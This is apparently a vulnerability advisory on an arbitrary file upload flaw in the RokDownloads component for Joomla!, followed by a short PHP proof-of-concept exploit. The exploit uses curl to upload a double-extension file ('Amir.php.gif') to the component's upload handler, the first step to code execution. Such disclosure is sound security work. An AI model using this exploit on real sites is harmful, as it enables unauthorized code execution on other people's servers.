source: http://www.securityfocus.com/bid/60690/info

The RokDownloads component for Joomla! is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application. 

<?php

  $uploadfile="Amir.php.gif";

  $ch = 
  curl_init("http://www.exemple.com/administrator/components/com_rokdownloads/assets/uploadhandler.php");
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS,
                array('Filedata'=>"@$uploadfile"));
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  $postResult = curl_exec($ch);
  curl_close($ch);
  print "$postResult";

  ?>
